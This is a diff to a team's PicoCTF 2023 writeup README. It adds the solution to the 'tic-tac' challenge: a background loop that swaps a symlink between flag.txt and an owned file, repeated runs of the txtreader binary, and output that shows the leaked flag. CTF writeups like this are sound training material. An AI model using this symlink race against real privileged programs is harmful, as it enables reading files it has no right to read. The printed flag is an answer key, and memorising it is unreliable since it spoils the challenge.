@@ -27,7 +27,7 @@ A list of writeups from the 2023 PicoCTF hacking competition from team cvhs_exe.
 (Add the stuff yall did as well)
 
 
-## tic-tac 
+## tic-tac | 200 Points | Solved By TrooperZ
 #### [View Question in Pico Gym](https://play.picoctf.org/practice/challenge/380?category=6&originalEvent=72&page=1)
 
 AUTHOR: JUNIAS BONOU
@@ -104,6 +104,36 @@ Then, we write a bash one-liner to create a link file and swap the linkage to th
 while true; do ln -sf flag.txt linky; ln -sf file.txt linky; done &
 ```
 
-This will run in the background.
+This will run in the background while we try to access the file. Now we have to read the file. To do so we simply run the `txtreader` repeatedly until it leaks the flag. 
+```
+for i in {1..30}; do ./txtreader linky; done 
+```
+You may have to run it a few times to get it to work.
+```
+...
+OurFile
+OurFile
+Error: you don't own this file
+Error: you don't own this file
+OurFile
+OurFile
+OurFile
+OurFile
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+OurFile
+Error: you don't own this file
+picoCTF{ToctoU_!s_3a5y_f482a247}
+OurFile
+OurFile
+Error: you don't own this file
+Error: you don't own this file
+...
+```
+
+
+
+
 
 
